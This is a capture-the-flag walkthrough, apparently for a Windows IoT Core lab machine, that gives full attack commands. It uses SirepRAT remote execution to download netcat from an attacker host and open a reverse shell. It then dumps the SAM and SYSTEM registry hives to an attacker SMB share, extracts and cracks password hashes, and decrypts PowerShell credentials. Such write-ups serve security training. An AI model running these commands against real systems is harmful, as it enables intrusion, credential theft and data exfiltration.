**Skills Required**
Web Enumeration
Windows Enumeration
**Skills Learned**
Windows IoT Core Exploitation
Registry Hive Hash Retrieval & Cracking
Powershell Credentials Enumeration


```
```
Curl Web Headers, SirepRAT, PowerShell, Copying Registry Hives, Transfer Backups, Impacket's smbserver, Dump Password Hashes, John the Ripper.

------------------

1. **Scan Port 8080 (HTTP) with WhatWeb**: WhatWeb is a tool for identifying web technologies. You can use it to gather information about the web application running on port 8080. This can be helpful for understanding the target system's technology stack.

   ```bash
   whatweb http://target_ip:8080
   ```

2. **Check Web Headers with Curl**: You can use the `curl` command to view HTTP headers from the web application running on port 8080. This can provide information about the server and other useful details.

   ```bash
   curl -I http://target_ip:8080
   ```

3. **Identify Vulnerabilities with SirepRAT**: SirepRAT is a tool for remote command execution on Windows machines. You can use it to exploit vulnerabilities. First, download Netcat for 64-bit Windows and upload it to the victim machine:

   ```bash
   python3 SirepRAT.py IP LaunchCommandWithOutput --return_output --cmd "powershell" --args "-c iwr -uri http://your_ip/nc64.exe -OutFile C:\Windows\System32\spool\drivers\color\nc64.exe"
   ```

4. **Execute a Reverse Shell with Netcat**: Once Netcat is uploaded, you can use it to establish a reverse shell connection back to your attacking machine:

   ```bash
   python3 SirepRAT.py IP LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd your_ip 1234"
   ```

5. **Set up Netcat Listener on Your Machine**: On your attacking machine, set up a Netcat listener to receive the reverse shell connection:

   ```bash
   nc -nlvp 1234
   ```

6. **Privilege Escalation**: Once you have access to the victim machine, you can escalate privileges and search for important files. For example, to find the user.txt file:

   ```bash
   dir /r /s user.txt
   ```

7. **Decrypting Passwords with PowerShell**: If passwords are encrypted on the Windows machine, you can use PowerShell to decrypt them. First, launch PowerShell:

   ```bash
   powershell
   ```

   Then use the following command to decrypt passwords (assuming you have the appropriate file):

   ```powershell
   (Import-CliXml -Path user.txt).GetNetworkCredential().password
   ```

8. **Copying System and SAM Registry Hives**: To dump the System and SAM registry hives, use these commands on the victim machine:

   ```bash
   reg save HKLM\system system.backup
   reg save HKLM\sam sam.backup
   ```

9. **Transfer Backups to Attacker Machine**: Use Impacket's smbserver to create a shared folder on your machine and then transfer the backups:

   ```bash
   impacket-smbserver smbFolder $(pwd) -smb2support -username kvzlx -password kvzlx1234
   ```

   On the victim machine:

   ```bash
   net use r: \\your_ip\smbFolder /user:kvzlx kvzlx1234
   copy sam.backup r:\sam
   copy system.backup r:\system
   ```

10. **Dump Password Hashes**: Use Impacket's secretsdump to extract password hashes:

    ```bash
    secretsdump -sam sam -system system LOCAL
    ```

11. **Crack Password Hashes with John**: If necessary, you can crack the password hashes using John the Ripper:

    ```bash
    john --wordlist=rockyou.txt hashes --format=NT
    ```

12. **Use Obtained Credentials**: Use the cracked password or obtained credentials to log in to the web application or other services, potentially gaining administrator access.

13. **Retrieve Root Flag**: Continue with the process, such as checking files like `iot-admin.xml` and using PowerShell to extract credentials. Once you have the credentials for the administrator, you can repeat the reverse shell process and retrieve the root flag.
